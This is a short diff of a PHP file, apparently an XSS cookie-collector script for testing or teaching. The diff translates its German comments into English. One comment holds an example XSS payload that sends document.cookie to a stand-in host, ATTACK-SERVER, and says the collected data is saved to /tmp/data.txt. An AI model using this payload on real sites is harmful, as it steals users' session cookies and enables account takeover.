@@ -1,10 +1,10 @@
 <?php
 
 /*
-Sammelt Informationen und speichert diese unter /tmp/data.txt
+Collects data and save them to /tmp/data.txt
 
 
-XSS Beispiele:
+XSS example:
 <script type="text/javascript">
 document.location='http://ATTACK-SERVER/x.php?c='+document.cookie;
 </script>
